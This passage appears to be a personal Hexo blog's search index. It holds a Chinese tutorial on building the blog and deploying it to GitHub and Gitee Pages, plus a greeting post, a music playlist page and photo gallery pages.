来建立文件。</p><p>Hexo的模板是指在新建的文章文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。</p></li><li><p>source</p><p>资源文件夹是存放用户资源的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹，而其他文件会被拷贝过去。</p></li><li><p>themes</p><p>主题 文件夹。Hexo 会根据主题来生成静态页面。</p></li></ul></blockquote><ol start="3"><li><p>博客部署与本地预览</p><p>hexo generate</p><p>hexo server</p><p>这里遇到一个问题，因为hexo的默认端口是4000端口，而我的电脑4000端口又已经被占用，所以它报错了，我只能切换端口号到4006，重新启动本地服务</p><p>hexo server -p 4006</p><p>然后复制 <a href="http://localhost:4006/" target="_blank" rel="noopener">http://localhost:4006/</a> 到你浏览器里，即可查看你的博客啦，当然，这只是本地的，我们还需要把它部署到GitHub上，以便联网使用。</p></li><li><p>hexo部署到GitHub</p><p>找到你的博客根目录，也就是你部署博客的目录，打开_config.yml文件，我这里用sublime打开，然后在最下面加上要部署的网址，格式如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> </span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:账户名/账户名.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>安装部署所需要的插件，deploy-git</p><p>git bash 中输入以下内容:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后继续在bash依次输入以下代码</p><p>hexo clean：清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p><p>hexo generate：生成静态文件。</p><p>hexo deploy：部署网站。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>这样就部署好了，访问用户名.github.io查阅你的博客吧</p></li></ol><h1 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h1><ol><li><p>如果你看腻了官网的主题想换主题，可以到官网的主题页面挑选自己喜欢的主题，然后下载后放到hexo里面的themes文件夹里面</p></li><li><p>接着，用sublime打开_config.yml文件，在theme处将主题名字粘贴进去，例如（我这用的是butterfly这个主题）</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">hexo-theme-butterfly-dev</span></span><br></pre></td></tr></table></figure></li><li><p>然后在hexo根目录下打开bash，输入下面的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   hexo clean </span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure></li><li><p>最后就可以看你更换后的博客啦，在每个主题下面的目录里也有_config.yml文件，你也可以通过配置该文件让自己的博客更显特色，注意，这里的_config.yml文件是配置主题样式的，不要和hexo下的config.yml混淆。</p></li></ol><h1 id="部署gitee"><a href="#部署gitee" class="headerlink" title="部署gitee"></a>部署gitee</h1><ol><li><p>这里gitee的部署和GitHub基本一致的，唯一不同的是，你每次更改配置或者上传文章后，需要到Gitee Pages 服务上重新更新一下</p></li><li><p>打开_config.yml文件，然后在最下面添加上要部署的gitee网址，格式如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> </span><br><span class="line">    <span class="attr">github:</span> <span class="string">git@github.com:账户名/账户名.github.io.git</span></span><br><span class="line">    <span class="attr">gitee:</span> <span class="string">git@gitee.com:账户名/账户名.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure></li><li><p>其它步骤跟连接github一样</p></li><li><p>到gitee你自己的博客仓库里，点击【服务】，【Gitee Pages 服务】</p></li><li><p>然后，点击更新（每次更新自己博客内容后都要点一次这个）</p><p><img src= "/img/loading.gif" data-src="/2020/07/01/Hexo/image-20200730171020709.png" alt="image-20200730171020709"></p></li><li><p>然后你就实现gitee＋github双线部署了</p></li></ol><p>到这里，教程就结束了，可能在gitee部署上会有点看不懂，可以去找找其它博客的gitee是如何部署的，基本都一致，最后你就可以享受属于你自己创建的博客啦，这是我自己的<a href="http://ypigy.gitee.io/" target="_blank" rel="noopener">博客</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 博客 </tag>
            
            <tag> gitee </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你好啊</title>
      <link href="/2020/06/27/hello-world/"/>
      <url>/2020/06/27/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h1><p>大家好啊，这是我的第一个博客，嘻嘻</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>music</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="你被写在我的歌里"><a href="#你被写在我的歌里" class="headerlink" title="你被写在我的歌里"></a>你被写在我的歌里</h2>    <div id="aplayer-dfXBDwQG" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7468974476" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="skyblue"></div><h2 id="那年青涩"><a href="#那年青涩" class="headerlink" title="那年青涩"></a>那年青涩</h2>    <div id="aplayer-kgsitkiI" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7305029495" data-server="tencent" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="pink"></div><h2 id="吱吱吱"><a href="#吱吱吱" class="headerlink" title="吱吱吱"></a>吱吱吱</h2>    <div id="aplayer-FDVxoadn" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="772861349" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="orange"></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>gallery</title>
      <link href="/gallery/index.html"/>
      <url>/gallery/index.html</url>
      
        <content type="html"><![CDATA[<div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-src="https://images.pexels.com/photos/814499/pexels-photo-814499.jpeg">  <figcaption>  <div class="gallery-group-name">壁纸</div>  <p>收藏的一些壁纸</p>  <a href="/gallery/%E5%A3%81%E7%BA%B8"></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img" src= "/img/loading.gif" data-src="/gallery/life/a.jpeg">  <figcaption>  <div class="gallery-group-name">生活</div>  <p>关于生活</p>  <a href="/gallery/life/"></a>  </figcaption>  </figure>  </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>gallery</title>
      <link href="/gallery/life/index.html"/>
      <url>/gallery/life/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="相机，原来不那么重要，它不过是我心的注解，眼的旁白—龙应台"><a href="#相机，原来不那么重要，它不过是我心的注解，眼的旁白—龙应台" class="headerlink" title="相机，原来不那么重要，它不过是我心的注解，眼的旁白—龙应台"></a>相机，原来不那么重要，它不过是我心的注解，眼的旁白—龙应台</h2><div class="justified-gallery"><p><img src= "/img/loading.gif" data-src="/gallery/life/hlgw.JPG" alt="深圳"><br><img src= "/img/loading.gif" data-src="/gallery/life/hwxhbs.jpg" alt="好吃的🧊"><br><img src= "/img/loading.gif" data-src="/gallery/life/xhy.JPG" alt="鸭子，你会游泳吗"></p>          </div>]]></content>
      
    </entry>
    
    
  
</search>
